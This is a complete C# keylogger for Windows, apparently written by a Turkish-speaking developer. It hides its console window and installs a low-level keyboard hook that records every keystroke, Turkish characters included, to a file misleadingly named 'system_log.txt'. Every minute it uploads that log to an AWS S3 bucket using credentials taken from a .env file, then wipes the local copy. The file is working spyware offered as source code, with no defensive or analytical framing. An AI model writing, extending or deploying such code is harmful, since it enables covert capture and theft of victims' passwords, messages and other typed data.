using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Amazon.S3;
using Amazon.S3.Model;
using System.Globalization;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(int wVirtKey, int wScanCode, byte[] lpKeyState, 
            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, int wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(int idThread);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static StringBuilder _keyLog = new StringBuilder();
        private static string _logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "system_log.txt");
        
        private static string _awsAccessKey;
        private static string _awsSecretKey;
        private static string _bucketName;
        private static string _awsRegion;
        private static System.Threading.Timer _uploadTimer;

        static void Main(string[] args)
        {
            LoadEnvironmentVariables();
            
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);

            _uploadTimer = new System.Threading.Timer(UploadLogToS3, null, TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(1));

            Application.Run();

            UnhookWindowsHookEx(_hookID);
        }

        private static void LoadEnvironmentVariables()
        {
            string envFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, ".env");

            File.AppendAllText(_logFilePath, $"[DEBUG] .env dosyası aranıyor: {envFilePath}\n", Encoding.UTF8);
            
            if (File.Exists(envFilePath))
            {
                File.AppendAllText(_logFilePath, $"[DEBUG] .env dosyası bulundu, okunuyor...\n", Encoding.UTF8);
                
                string[] lines = File.ReadAllLines(envFilePath);
                foreach (string line in lines)
                {
                    if (string.IsNullOrWhiteSpace(line) || line.StartsWith("#"))
                        continue;

                    string[] parts = line.Split('=', 2);
                    if (parts.Length == 2)
                    {
                        string key = parts[0].Trim();
                        string value = parts[1].Trim();

                        switch (key)
                        {
                            case "AWS_ACCESS_KEY":
                                _awsAccessKey = value;
                                File.AppendAllText(_logFilePath, $"[DEBUG] AWS_ACCESS_KEY yüklendi\n", Encoding.UTF8);
                                break;
                            case "AWS_SECRET_KEY":
                                _awsSecretKey = value;
                                File.AppendAllText(_logFilePath, $"[DEBUG] AWS_SECRET_KEY yüklendi\n", Encoding.UTF8);
                                break;
                            case "AWS_BUCKET_NAME":
                                _bucketName = value;
                                File.AppendAllText(_logFilePath, $"[DEBUG] AWS_BUCKET_NAME yüklendi: {value}\n", Encoding.UTF8);
                                break;
                            case "AWS_REGION":
                                _awsRegion = value;
                                File.AppendAllText(_logFilePath, $"[DEBUG] AWS_REGION yüklendi: {value}\n", Encoding.UTF8);
                                break;
                        }
                    }
                }
            }
            else
            {
                File.AppendAllText(_logFilePath, $"[ERROR] .env dosyası bulunamadı: {envFilePath}\n", Encoding.UTF8);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyPressed = GetKeyName(vkCode);
                
                _keyLog.Append(keyPressed);
                
                try
                {
                    File.AppendAllText(_logFilePath, keyPressed, Encoding.UTF8);
                }
                catch { }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetKeyName(int vkCode)
        {
            bool capsLock = (GetKeyState(0x14) & 0x0001) != 0;
            bool shiftPressed = (GetKeyState(0x10) & 0x8000) != 0;
            
            if (shiftPressed)
            {
                switch (vkCode)
                {
                    case 0xBA: return "Ö";
                    case 0xDE: return "İ";
                    case 0xDB: return "Ğ";
                    case 0xDD: return "Ü";
                    case 0xC0: return "Ş";
                    case 0xBF: return "Ç";
                }
            }
            else
            {
                switch (vkCode)
                {
                    case 0xBA: return "ş";
                    case 0xDE: return "i";
                    case 0xDB: return "ğ";
                    case 0xDD: return "ü";
                    case 0xC0: return "ö";
                    case 0xBF: return "ç";
                }
            }
            
            switch (vkCode)
            {
                case 0x08: return "[BACKSPACE]";
                case 0x09: return "[TAB]";
                case 0x0D: return "[ENTER]\n";
                case 0x10: return "[SHIFT]";
                case 0x11: return "[CTRL]";
                case 0x12: return "[ALT]";
                case 0x1B: return "[ESC]";
                case 0x20: return " ";
                case 0x2E: return "[DELETE]";
                case 0x25: return "[LEFT]";
                case 0x26: return "[UP]";
                case 0x27: return "[RIGHT]";
                case 0x28: return "[DOWN]";
                default:
                    StringBuilder keyName = new StringBuilder(256);
                    byte[] keyboardState = new byte[256];
                    GetKeyboardState(keyboardState);
                    
                    if (shiftPressed)
                        keyboardState[0x10] = 0x80;
                    if (capsLock)
                        keyboardState[0x14] = 0x01;
                    
                    int result = ToUnicodeEx(vkCode, 0, keyboardState, keyName, keyName.Capacity, 0, GetKeyboardLayout(0));
                    
                    if (result > 0)
                    {
                        return keyName.ToString(0, result);
                    }
                    
                    string key = ((Keys)vkCode).ToString();
                    
                    if (key.Length == 1 && char.IsLetter(key[0]))
                    {
                        bool shouldBeUpper = (capsLock && !shiftPressed) || (!capsLock && shiftPressed);
                        return shouldBeUpper ? key.ToUpper() : key.ToLower();
                    }
                    
                    return key;
            }
        }

        private static async void UploadLogToS3(object state)
        {
            try
            {
                if (!File.Exists(_logFilePath) || new FileInfo(_logFilePath).Length == 0)
                    return;

                // AWS bilgilerinin null olup olmadığını kontrol et
                if (string.IsNullOrEmpty(_awsAccessKey) || string.IsNullOrEmpty(_awsSecretKey) || 
                    string.IsNullOrEmpty(_bucketName) || string.IsNullOrEmpty(_awsRegion))
                {
                    File.AppendAllText(_logFilePath, $"\n[S3 UPLOAD ERROR: AWS bilgileri eksik. .env dosyasını kontrol edin.]\n", Encoding.UTF8);
                    File.AppendAllText(_logFilePath, $"AccessKey: {(_awsAccessKey != null ? "OK" : "NULL")}, SecretKey: {(_awsSecretKey != null ? "OK" : "NULL")}, Bucket: {(_bucketName != null ? "OK" : "NULL")}, Region: {(_awsRegion != null ? "OK" : "NULL")}\n", Encoding.UTF8);
                    return;
                }

                var config = new AmazonS3Config()
                {
                    RegionEndpoint = Amazon.RegionEndpoint.GetBySystemName(_awsRegion)
                };

                using (var s3Client = new AmazonS3Client(_awsAccessKey, _awsSecretKey, config))
                {
                    string fileName = $"keylog_{DateTime.Now:yyyyMMdd_HHmmss}.txt";

                    // Parametrelerin null olmadığından emin ol
                    if (string.IsNullOrEmpty(fileName) || string.IsNullOrEmpty(_bucketName))
                    {
                        File.AppendAllText(_logFilePath, $"\n[S3 UPLOAD ERROR: FileName veya BucketName null. FileName: {fileName}, BucketName: {_bucketName}]\n", Encoding.UTF8);
                        return;
                    }

                    var request = new PutObjectRequest()
                    {
                        BucketName = _bucketName,
                        Key = fileName,
                        FilePath = _logFilePath,
                        ContentType = "text/plain"
                    };

                    await s3Client.PutObjectAsync(request);

                    File.WriteAllText(_logFilePath, "");
                    
                    File.AppendAllText(_logFilePath, $"[{DateTime.Now:dd/MM/yyyy HH:mm:ss}] Log dosyası S3'e başarıyla yüklendi: {fileName}\n", Encoding.UTF8);
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText(_logFilePath, $"\n[S3 UPLOAD ERROR: {ex.Message}]\n", Encoding.UTF8);
                if (ex.InnerException != null)
                {
                    File.AppendAllText(_logFilePath, $"[INNER EXCEPTION: {ex.InnerException.Message}]\n", Encoding.UTF8);
                }
            }
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}